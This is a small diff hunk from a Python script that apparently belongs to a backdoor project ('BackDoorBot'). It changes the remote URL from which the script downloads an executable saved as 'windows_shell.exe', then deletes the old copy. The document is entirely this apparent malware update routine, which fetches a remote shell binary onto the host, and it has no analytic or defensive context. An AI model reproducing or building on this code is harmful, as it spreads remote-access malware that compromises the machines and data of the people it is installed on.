@@ -35,7 +35,7 @@ while 1:
             i=input()
             break
         else:
-            wget.download(f"https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/windows_shell{ipo}.exe", p+"/vers/windows_shell.exe")
+            wget.download(f"https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe", p+"/vers/windows_shell.exe")
             try:
                 os.remove(p+"/windows_shell.exe")
             except: pass
